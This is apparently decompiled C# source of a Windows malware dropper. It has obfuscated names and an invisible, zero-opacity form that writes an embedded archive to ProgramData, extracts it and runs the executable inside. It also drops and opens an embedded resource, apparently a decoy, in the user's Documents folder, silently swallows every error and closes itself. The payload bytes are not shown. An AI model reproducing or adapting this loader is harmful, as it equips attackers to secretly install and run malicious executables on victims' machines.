using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using rmwatdtha.My.Resources;

namespace rmwatdtha;

[DesignerGenerated]
public class Form1 : Form
{
	private string appName;

	private string appPath;

	private object shObj;

	private IContainer components;

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		appName = "valthasrvin";
		appPath = "\\Gthrentl\\";
		shObj = RuntimeHelpers.GetObjectValue(Activator.CreateInstance(Type.GetTypeFromProgID("Shell.Application")));
		InitializeComponent();
	}

	public void UnZwip()
	{
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + appPath;
			Class1 @class = new Class1();
			byte[] wind = @class.getWind();
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			string text2 = text + appName;
			File.WriteAllBytes(text2, wind);
			string text3 = text2 + ".zip";
			if (!File.Exists(text3))
			{
				File.Move(text2, text3);
			}
			string text4 = text2 + ".exe".ToString();
			if (!File.Exists(text4))
			{
				object objectValue = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(shObj, (Type)null, "NameSpace", new object[1] { text }, (string[])null, (Type[])null, (bool[])null));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(shObj, (Type)null, "NameSpace", new object[1] { text3 }, (string[])null, (Type[])null, (bool[])null));
				NewLateBinding.LateCall(objectValue, (Type)null, "CopyHere", new object[2]
				{
					NewLateBinding.LateGet(objectValue2, (Type)null, "Items", new object[0], (string[])null, (Type[])null, (bool[])null),
					4
				}, (string[])null, (Type[])null, (bool[])null, true);
			}
			Process.Start(text4);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void iddmt()
	{
		string path = "";
		string text = "";
		if (File.Exists(path))
		{
			StreamReader streamReader = new StreamReader(path);
			while (streamReader.Peek() != -1)
			{
				text = streamReader.ReadLine();
				Strings.Split(text, "e", -1, (CompareMethod)0);
			}
		}
	}

	public void dbsrualbmloadMe()
	{
		try
		{
			string text = Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()) + "-02".ToString();
			rmwatdtha rmwatdtha2 = new rmwatdtha();
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
			string text3 = text2 + text + " " + rmwatdtha2.file_Ext.ToString();
			if (!File.Exists(text3) && Resources.rmwatdtha.Length > 160)
			{
				File.WriteAllBytes(text3, Resources.rmwatdtha);
			}
			if (File.Exists(text3))
			{
				Process.Start(text3);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread.Sleep(1100);
		UnZwip();
		Thread.Sleep(2100);
		dbsrualbmloadMe();
		Thread.Sleep(8100);
		try
		{
			((Form)this).Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(0, 0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}
}
